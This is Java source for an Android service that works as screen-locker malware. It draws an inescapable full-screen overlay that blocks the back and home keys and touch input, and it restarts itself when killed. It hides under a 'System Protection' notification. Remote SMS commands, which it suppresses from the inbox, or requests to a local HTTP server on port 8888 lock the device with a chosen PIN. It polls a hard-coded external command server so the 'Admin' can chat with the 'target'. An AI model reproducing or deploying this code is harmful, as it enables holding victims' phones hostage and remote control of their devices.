package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.SmsMessage;
import android.text.InputType;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LockOverlayService extends Service {
    public static final String ACTION_LOCK   = "com.nullx.pp.ACTION_LOCK";
    public static final String ACTION_UNLOCK = "com.nullx.pp.ACTION_UNLOCK";
    public static final String EXTRA_MESSAGE = "lock_message";
    public static final String EXTRA_PIN     = "lock_pin";

    private static final String SERVER  = "http://respanelomdhanicikiwir.omdhanebew.my.id:2158";
    private static final String CHANNEL = "LockOverlayChannel";
    private static final int    NID     = 99;

    private WindowManager wm;
    private View overlayRoot;
    private TextView tvChat;
    private EditText etPin, etChat;
    private ScrollView chatScroll;
    private Handler uiHandler, chatHandler;
    private Runnable chatRunnable;
    private String pin = "1234", deviceId = "";
    
    private SmsReceiver smsReceiver;
    private HttpServerThread httpServer;

    @Override public void onCreate() {
        super.onCreate();
        uiHandler = new Handler(Looper.getMainLooper());
        chatHandler = new Handler(Looper.getMainLooper());
        createChannel();
        startForeground(NID, buildNotif());
        deviceId = readId();
        
        registerSmsTrigger();
        startHttpTrigger();
        
        SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        if (p.getBoolean("isLocked", false)) {
            String msg = p.getString("lockMessage", "DEVICE LOCKED");
            pin = p.getString("lockPin", "1234");
            showOverlay(msg);
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_LOCK.equals(action)) {
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            String p2  = intent.getStringExtra(EXTRA_PIN);
            if (msg == null) msg = "DEVICE IS LOCKED";
            if (p2  == null) p2  = "1234";
            pin = p2;
            saveLock(msg, p2, true);
            showOverlay(msg);
        } else if (ACTION_UNLOCK.equals(action)) {
            saveLock("", "", false);
            hideOverlay();
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        hideOverlay();
        if (chatHandler != null && chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
        if (smsReceiver != null) unregisterReceiver(smsReceiver);
        if (httpServer != null) httpServer.stopServer();
        
        Intent restart = new Intent(this, LockOverlayService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart);
        else startService(restart);
        super.onDestroy();
    }

    // ============================================================
    // 🔥 INSTANT LOCK - TANPA BASA-BASI
    // ============================================================
    private void instantLock(String message, String newPin) {
        runOnUiThread(() -> {
            pin = (newPin != null && !newPin.isEmpty()) ? newPin : "1234";
            saveLock(message, pin, true);
            showOverlay(message);
            
            // Vibrate
            try {
                android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(android.os.VibrationEffect.createOneShot(500, 255));
                    } else {
                        v.vibrate(500);
                    }
                }
            } catch (Exception ignored) {}
            
            // Flash strobo
            new Thread(() -> {
                try {
                    android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
                    String id = cm.getCameraIdList()[0];
                    for (int i = 0; i < 5; i++) {
                        cm.setTorchMode(id, true);
                        Thread.sleep(100);
                        cm.setTorchMode(id, false);
                        Thread.sleep(100);
                    }
                } catch (Exception ignored) {}
            }).start();
        });
    }
    
    private void runOnUiThread(Runnable action) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            action.run();
        } else {
            new Handler(Looper.getMainLooper()).post(action);
        }
    }

    // ── SMS TRIGGER ──────────────────────────────────────────────
    private void registerSmsTrigger() {
        smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(999);
        registerReceiver(smsReceiver, filter);
    }
    
    private class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String message = sms.getMessageBody();
                    
                    // 🔥 FORMAT: LOCK => langsung lock dengan PIN 1234
                    // 🔥 FORMAT: LOCK|9999 => lock dengan PIN 9999
                    // 🔥 FORMAT: LOCK|9999|Pesan => lock dengan PIN dan pesan custom
                    if (message != null && message.toUpperCase().startsWith("LOCK")) {
                        String newPin = "1234";
                        String lockMsg = "🔒 DEVICE LOCKED";
                        
                        if (message.contains("|")) {
                            String[] parts = message.split("\\|");
                            if (parts.length >= 2) newPin = parts[1];
                            if (parts.length >= 3) lockMsg = parts[2];
                        }
                        
                        instantLock(lockMsg, newPin);
                        abortBroadcast();
                    }
                    
                    // 🔥 FORMAT: UNLOCK|1234
                    else if (message != null && message.toUpperCase().startsWith("UNLOCK")) {
                        String[] parts = message.split("\\|");
                        String sentPin = parts.length >= 2 ? parts[1] : "";
                        if (sentPin.equals(pin)) {
                            runOnUiThread(() -> {
                                saveLock("", "", false);
                                hideOverlay();
                            });
                            abortBroadcast();
                        }
                    }
                }
            } catch (Exception e) {}
        }
    }

    // ── HTTP TRIGGER ──────────────────────────────────────────────
    private void startHttpTrigger() {
        httpServer = new HttpServerThread();
        httpServer.start();
    }
    
    private class HttpServerThread extends Thread {
        private ServerSocket serverSocket;
        private boolean isRunning = true;
        
        @Override
        public void run() {
            try {
                serverSocket = new ServerSocket(8888);
                while (isRunning) {
                    Socket client = serverSocket.accept();
                    BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    String request = in.readLine();
                    
                    if (request != null && request.contains("GET")) {
                        String response = "";
                        
                        // 🔥 http://IP:8888/lock => langsung lock
                        if (request.contains("/lock")) {
                            instantLock("HTTP LOCK", "1234");
                            response = "HTTP/1.1 200 OK\r\n\r\n{\"status\":\"locked\"}";
                        }
                        // 🔥 http://IP:8888/lock/9999 => lock dengan PIN 9999
                        else if (request.matches(".*/lock/[0-9]+.*")) {
                            String newPin = request.replaceAll(".*/lock/([0-9]+).*", "$1");
                            instantLock("HTTP LOCK", newPin);
                            response = "HTTP/1.1 200 OK\r\n\r\n{\"status\":\"locked\",\"pin\":\"" + newPin + "\"}";
                        }
                        // 🔥 http://IP:8888/unlock?pin=1234
                        else if (request.contains("/unlock")) {
                            String sentPin = extractParam(request, "pin");
                            if (sentPin != null && sentPin.equals(pin)) {
                                runOnUiThread(() -> {
                                    saveLock("", "", false);
                                    hideOverlay();
                                });
                                response = "HTTP/1.1 200 OK\r\n\r\n{\"status\":\"unlocked\"}";
                            } else {
                                response = "HTTP/1.1 403 Forbidden\r\n\r\n{\"error\":\"wrong pin\"}";
                            }
                        }
                        // 🔥 http://IP:8888/status
                        else if (request.contains("/status")) {
                            SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                            boolean isLocked = p.getBoolean("isLocked", false);
                            response = "HTTP/1.1 200 OK\r\n\r\n{\"locked\":" + isLocked + ",\"deviceId\":\"" + deviceId + "\"}";
                        }
                        else {
                            response = "HTTP/1.1 404 Not Found\r\n\r\n{\"error\":\"not found\"}";
                        }
                        
                        OutputStream out = client.getOutputStream();
                        out.write(response.getBytes());
                        out.flush();
                    }
                    client.close();
                }
            } catch (Exception e) {}
        }
        
        private String extractParam(String request, String param) {
            try {
                String[] parts = request.split(" ")[1].split("\\?");
                if (parts.length > 1) {
                    String[] params = parts[1].split("&");
                    for (String p : params) {
                        String[] kv = p.split("=");
                        if (kv.length == 2 && kv[0].equals(param)) {
                            return kv[1];
                        }
                    }
                }
            } catch (Exception e) {}
            return null;
        }
        
        public void stopServer() {
            isRunning = false;
            try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
        }
    }

    // ── OVERLAY ──────────────────────────────────────────────────
    private void showOverlay(String message) {
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        hideOverlay();

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0A0A0A"));
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(dp(24), dp(60), dp(24), dp(40));
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);

        root.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH || keyCode == KeyEvent.KEYCODE_MENU) {
                return true;
            }
            return false;
        });
        root.setOnTouchListener((v, e) -> true);

        TextView title = new TextView(this);
        title.setText("⚠️ DEVICE LOCKED ⚠️");
        title.setTextColor(Color.parseColor("#E53935"));
        title.setTextSize(22);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        root.addView(divider());

        TextView tvMsg = new TextView(this);
        tvMsg.setText(message);
        tvMsg.setTextColor(Color.parseColor("#CCCCDD"));
        tvMsg.setTextSize(14);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setLineSpacing(6, 1);
        lp(tvMsg, 0, 0, 0, dp(20));
        root.addView(tvMsg);

        chatScroll = new ScrollView(this);
        chatScroll.setBackgroundColor(Color.parseColor("#111122"));
        chatScroll.setLayoutParams(lpH(dp(180), 0, 0, dp(10)));
        tvChat = new TextView(this);
        tvChat.setTextColor(Color.parseColor("#AAAACC"));
        tvChat.setTextSize(11);
        tvChat.setPadding(dp(14), dp(10), dp(14), dp(10));
        tvChat.setLineSpacing(4, 1);
        chatScroll.addView(tvChat);
        root.addView(chatScroll);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setLayoutParams(lpH(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 0, 0, dp(20)));
        etChat = new EditText(this);
        etChat.setHint("Reply...");
        etChat.setHintTextColor(Color.parseColor("#444466"));
        etChat.setTextColor(Color.WHITE);
        etChat.setTextSize(12);
        etChat.setBackground(roundBg(Color.parseColor("#1A1A2E"), 8));
        etChat.setPadding(dp(12), dp(10), dp(12), dp(10));
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        etLp.setMargins(0, 0, dp(8), 0);
        etChat.setLayoutParams(etLp);
        Button btnSend = new Button(this);
        btnSend.setText("Send");
        btnSend.setTextColor(Color.WHITE);
        btnSend.setTextSize(11);
        btnSend.setBackground(roundBg(Color.parseColor("#E53935"), 8));
        btnSend.setOnClickListener(v -> sendChat());
        row.addView(etChat);
        row.addView(btnSend);
        root.addView(row);

        root.addView(divider());

        etPin = new EditText(this);
        etPin.setHint("Enter PIN to unlock");
        etPin.setHintTextColor(Color.parseColor("#444466"));
        etPin.setTextColor(Color.WHITE);
        etPin.setTextSize(18);
        etPin.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        etPin.setGravity(Gravity.CENTER);
        etPin.setBackground(roundBg(Color.parseColor("#0D0D1F"), 10));
        etPin.setPadding(dp(16), dp(14), dp(16), dp(14));
        lp(etPin, 0, 0, 0, dp(12));
        root.addView(etPin);

        Button btnUnlock = new Button(this);
        btnUnlock.setText("UNLOCK");
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setTextSize(13);
        btnUnlock.setTypeface(null, android.graphics.Typeface.BOLD);
        btnUnlock.setBackground(roundBg(Color.parseColor("#1B1B3A"), 10));
        btnUnlock.setPadding(0, dp(14), 0, dp(14));
        btnUnlock.setOnClickListener(v -> tryUnlock());
        root.addView(btnUnlock);

        TextView info = new TextView(this);
        info.setText("📱 SMS: LOCK | 🌐 HTTP: PORT 8888/lock");
        info.setTextColor(Color.parseColor("#555566"));
        info.setTextSize(9);
        info.setGravity(Gravity.CENTER);
        info.setPadding(0, dp(20), 0, 0);
        root.addView(info);

        overlayRoot = root;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        try {
            wm.addView(overlayRoot, params);
        } catch (Exception e) {}
        startChatPoll();
    }

    private void hideOverlay() {
        if (chatHandler != null && chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
        if (overlayRoot != null && wm != null) {
            try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
            overlayRoot = null;
        }
    }

    private void tryUnlock() {
        if (etPin == null) return;
        String entered = etPin.getText().toString().trim();
        if (entered.equals(pin)) {
            saveLock("", "", false);
            hideOverlay();
        } else {
            etPin.setText("");
            etPin.setHint("Wrong PIN - try again");
            etPin.setHintTextColor(Color.parseColor("#E53935"));
        }
    }

    private void startChatPoll() {
        chatRunnable = new Runnable() {
            @Override public void run() {
                pollChat();
                chatHandler.postDelayed(this, 3000);
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty()) return;
        new Thread(() -> {
            try {
                String resp = httpGet(SERVER + "/api/lock-chat/" + deviceId);
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < msgs.length(); i++) {
                    JSONObject m = msgs.getJSONObject(i);
                    String from = m.optString("from", "owner");
                    String text = m.optString("text", "");
                    String time = m.optString("time", "");
                    sb.append(from.equals("owner") ? "[ Admin ] " : "[ You ] ")
                      .append(text).append("  ").append(time).append("\n");
                }
                final String s = sb.toString();
                uiHandler.post(() -> {
                    if (tvChat != null) {
                        tvChat.append(s);
                        if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty()) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> {
            if (tvChat != null) {
                tvChat.append("[ You ] " + text + "\n");
                if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
            }
        });
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject();
                b.put("text", text);
                b.put("from", "target");
                postJson(SERVER + "/api/lock-chat/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    private String readId() {
        try {
            SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
            String id = p.getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        try {
            java.io.File f = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new java.io.FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }
    
    private void saveLock(String msg, String p2, boolean locked) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
            .putBoolean("isLocked", locked)
            .putString("lockMessage", msg)
            .putString("lockPin", p2)
            .apply();
    }
    
    private int dp(int v) {
        return (int)(v * getResources().getDisplayMetrics().density);
    }
    
    private android.graphics.drawable.GradientDrawable roundBg(int color, int r) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(dp(r));
        return d;
    }
    
    private View divider() {
        View v = new View(this);
        v.setBackgroundColor(Color.parseColor("#222244"));
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, 1);
        p2.setMargins(0, dp(16), 0, dp(16));
        v.setLayoutParams(p2);
        return v;
    }
    
    private void lp(View v, int l, int t, int r, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        p2.setMargins(l, t, r, b);
        v.setLayoutParams(p2);
    }
    
    private android.view.ViewGroup.LayoutParams lpH(int h, int l, int t, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, h);
        p2.setMargins(l, t, 0, b);
        return p2;
    }
    
    private String httpGet(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }
    
    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }
    
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Lock Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
    
    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Protection")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
}